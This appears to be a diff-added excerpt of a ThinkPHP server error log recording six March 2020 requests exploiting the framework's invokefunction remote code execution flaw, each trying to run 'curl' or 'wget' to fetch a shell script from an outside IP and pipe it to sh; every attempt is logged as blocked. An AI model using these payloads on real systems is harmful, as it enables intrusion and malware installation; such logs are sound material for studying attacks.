+[ 2020-03-16T21:34:08+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T21:34:10+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T22:27:21+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T22:27:23+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T23:27:45+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T23:27:46+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
